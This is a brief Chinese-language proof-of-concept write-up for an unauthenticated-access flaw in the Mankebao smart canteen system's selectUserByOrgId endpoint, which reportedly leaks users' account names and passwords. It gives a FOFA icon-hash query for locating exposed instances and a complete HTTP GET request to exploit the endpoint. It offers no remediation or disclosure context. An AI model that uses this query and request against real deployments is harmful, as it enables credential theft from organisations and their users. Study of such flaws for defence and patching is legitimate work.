# 满客宝智慧食堂系统selectUserByOrgId存在未授权访问漏洞

**满客宝智慧食堂系统 selectUserByOrgId 接口处未进行权限控制，导致未经身份验证的远程攻击者可以未授权访问，泄露系统用户账号密码等信息.**

## fofa

```yaml
icon_hash="-409875651"
```

## poc

```yaml
GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20240806235606039](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408062356228.png)